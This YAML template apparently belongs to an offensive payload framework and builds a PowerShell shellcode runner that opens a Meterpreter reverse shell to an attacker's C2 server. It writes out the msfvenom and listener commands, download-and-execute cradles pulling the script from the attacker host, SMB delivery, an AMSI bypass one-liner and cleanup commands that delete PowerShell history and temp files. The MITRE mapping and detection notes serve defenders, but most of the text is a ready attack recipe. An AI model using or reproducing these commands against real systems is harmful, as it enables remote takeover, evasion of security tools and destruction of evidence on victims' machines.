meta:
  name: "Shellcode Runner, Add-Type (PowerShell)"
  category: "Shellcode Execution"
  description: |
    PowerShell shellcode runner using Add-Type for P/Invoke declarations.

    Features:
    - VirtualAlloc for memory allocation with RWX permissions
    - CreateThread to execute shellcode in new thread
    - WaitForSingleObject to prevent premature exit
    - Simple and straightforward implementation

    WARNING: Add-Type writes temporary files to disk, making this less stealthy.
    Consider reflective alternatives for operational use.

    Suitable for testing and lab environments.

  effectiveness: low

  mitre:
    tactic: "TA0002 - Execution"
    technique: "T1059.001 - Command and Scripting Interpreter: PowerShell"

  artifacts:
    - "Add-Type creates temporary C# source files in %TEMP%"
    - "Compiled DLL files left in user's temp directory"
    - "VirtualAlloc with PAGE_EXECUTE_READWRITE (0x40)"
    - "CreateThread API calls"
    - "Network connection to C2 server"
    - "PowerShell script execution logs"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "payload_type"
    type: "choice"
    description: "Meterpreter payload type"
    required: false
    default: "reverse_https"
    choices: ["reverse_tcp", "reverse_http", "reverse_https"]

  - name: "output_file"
    type: "string"
    description: "Output PowerShell script filename"
    required: false
    default: "Run.ps1"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/{{ payload_type }} LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
    output_var: "raw_shellcode"

  # Step 2: Format shellcode as PowerShell byte array
  - type: "script"
    name: "format_payload"
    script: "format_powershell.py"
    args:
      data: "{{ raw_shellcode }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "powershell_payload"

output:
  type: "template"
  template: "shellcode_runner/addtype_runner.ps1"
  compile:
    enabled: false
  launch_instructions: |
    **WARNING:** This technique is easily detected and leaves disk artifacts. Use only in lab/testing environments or where stealth is not required.

    # Start Listener

    ```bash
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/{{ payload_type }}; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
    ```

    # Transfer and Execute (In-Memory)

    ```powershell
    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
    ```

    # Alternative (File-Based)

    **Attacker:**
    ```bash
    python3 -m http.server 80
    ```

    **Target:**
    ```powershell
    powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
    ```

    # Alternative (SMB):

    **Attacker:**
    ```bash
    smbserver.py share {{ output_path }}/{{ output_file }} -smb2support
    ```

    **Target:**
    ```cmd
    copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && powershell -ep bypass -File {{ output_file }}
    ```

    # Notes:
    - Payload type: windows/x64/meterpreter/{{ payload_type }}
    - EXITFUNC=thread ensures clean thread termination
    - Add-Type compiles C# code and leaves artifacts in %TEMP% directory (temporary C# source files, compiled DLL assemblies)
    - VirtualAlloc allocates RWX memory (highly suspicious to EDR)
    - CreateThread executes shellcode in separate thread
    - WaitForSingleObject prevents script from exiting before shellcode completes
    - Well-known technique - heavily monitored by AV/EDR
    - AMSI (Anti-Malware Scan Interface) will likely catch this
    - For better OPSEC, use reflective loading techniques instead of Add-Type
    - Reverse shell connects to {{ lhost }}:{{ lport }}

    # Troubleshooting:
    - Execution policy blocks: Use -ExecutionPolicy Bypass flag (already included in examples)
    - AMSI blocks: Implement AMSI bypass before execution: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
    - AV blocks: Add obfuscation with Invoke-Obfuscation or use reflective techniques
    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
    - Script errors: Ensure PowerShell version 3.0 or higher
    - Add-Type compilation fails: Check .NET Framework installed on target
    - Detection: Add-Type cmdlet logged in PowerShell transcripts (Event ID 4104), compilation events in Windows logs
    - Memory allocation with RWX triggers EDR alerts

    # Cleanup:
    **On target:**
    ```powershell
    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    ```

    **Clean TEMP artifacts:**
    ```powershell
    Remove-Item $env:TEMP\*.dll -Force -ErrorAction SilentlyContinue
    Remove-Item $env:TEMP\*.cs -Force -ErrorAction SilentlyContinue
    ```